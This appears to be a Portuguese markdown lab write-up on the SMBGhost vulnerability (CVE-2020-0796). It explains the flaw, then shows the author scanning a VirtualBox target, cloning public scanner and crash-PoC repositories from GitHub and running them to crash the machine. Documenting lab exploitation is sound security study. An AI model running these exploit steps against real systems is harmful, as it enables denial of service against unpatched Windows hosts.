@@ -1,0 +1,107 @@
+# CVE‑2020‑0796
+
+O **CVE‑2020‑0796**, também conhecido como **SMBGhost**, é uma vulnerabilidade crítica que afeta o protocolo **SMBv3 (Server Message Block 3.1.1)** em versões específicas do Windows.
+
+Trata-se de uma falha de **execução remota de código (RCE)**, permitindo que um atacante não autenticado possa enviar pacotes especialmente malformados ao sistema alvo, explorando a forma como o SMBv3 lida com compressão de pacotes.
+
+A gravidade é avaliada como **10.0 (Crítica)** na escala CVSS v3, significando impacto máximo e sem necessidade de autenticação.
+
+### Sistemas afetados
+
+* **Windows 10 (versões 1903 e 1909)**: 32‑bit, x64 e ARM64
+* **Windows Server (1903 e 1909)** — especialmente em instalações Server Core.
+
+### Como funciona a exploração?
+
+A vulnerabilidade ocorre devido a um **buffer overflow** causado por um **integer overflow**. O servidor (ou cliente) calcula erroneamente o tamanho do buffer com base em dados malformados (como `OriginalSize = 0xFFFFFFFF` e um `Offset` elevado), resultando na alocação de um buffer muito pequeno. Quando os dados são descomprimidos, ocorre sobrecarga de memória — levando potencialmente a execução de código remoto ou falha do sistema (BSOD).
+
+* A ameaça é especialmente séria porque é **wormable**, ou seja, pode se propagar automaticamente entre sistemas vulneráveis — em estilo semelhante ao ransomware WannaCry.
+* Foram publicados **códigos proof-of-concept (PoCs)** que exploram essa vulnerabilidade, inclusive através de ferramentas como o Metasploit.
+
+## Verificando se o alvo tem a vunerabilidade
+
+Verificando as portas abertas da máquina alvo
+```
+$ nmap -sS 192.168.1.39
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 22:23 -03
+Nmap scan report for 192.168.1.39
+Host is up (0.00030s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:15:FF:CF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 18.79 seconds
+```
+**Busca no Google:** `CVE‑2020‑0796 github`
+
+Encontramos um scanner para vunerabilidade<br>
+[Scanner](https://github.com/ButrintKomoni/cve-2020-0796)
+
+### Copiando o Scanner
+```
+$ git clone https://github.com/ButrintKomoni/cve-2020-0796
+Cloning into 'cve-2020-0796'...
+remote: Enumerating objects: 21, done.
+remote: Counting objects: 100% (21/21), done.
+remote: Compressing objects: 100% (19/19), done.
+remote: Total 21 (delta 3), reused 11 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (21/21), 5.74 KiB | 5.74 MiB/s, done.
+Resolving deltas: 100% (3/3), done.
+```
+`$ cd cve-2020-0796`
+```
+$ ls
+cve-2020-0796-scanner.py  README.md
+```
+### Executando o scanner
+```
+$ python3 cve-2020-0796-scanner.py 192.168.1.39
+Vulnerable
+```
+**Conclusão:** A máquina alvo está vunerável
+
+## Ataque - crash da máquina alvo
+
+A pesquisa no Google nos fornece um ataque que 'derruba' a OS da máquina alvo.<br>
+[Ataque](https://github.com/jiansiting/CVE-2020-0796)
+
+### Copiando o ataque
+```
+$ git clone https://github.com/jiansiting/CVE-2020-0796
+Cloning into 'CVE-2020-0796'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (10/10), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 10 (delta 1), reused 10 (delta 1), pack-reused 0 (from 0)
+Receiving objects: 100% (10/10), 406.04 KiB | 4.95 MiB/s, done.
+Resolving deltas: 100% (1/1), done.
+```
+`$ cd CVE-2020-0796`
+```
+$ ls
+cve-2020-0796.py  demo.gif  README.md
+```
+### Executando o ataque
+```
+$ python3 cve-2020-0796.py 192.168.1.39
+***********************
+*  CVE-2020-0796 PoC  *
+*  By Jiansiting      *
+***********************
+Traceback (most recent call last):
+  File "/home/OpsShadow/Documentos/White Hat/CVE-2020-0796/cve-2020-0796.py", line 111, in <module>
+    send_compressed(sock, "JST" * 100)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^
+  File "/home/OpsShadow/Documentos/White Hat/CVE-2020-0796/cve-2020-0796.py", line 98, in send_compressed
+    sock.recv(1000)
+    ~~~~~~~~~^^^^^^
+TimeoutError: timed out
+```
+### Resultado
+Crash na máquina alvo.
+!Crash
+
+
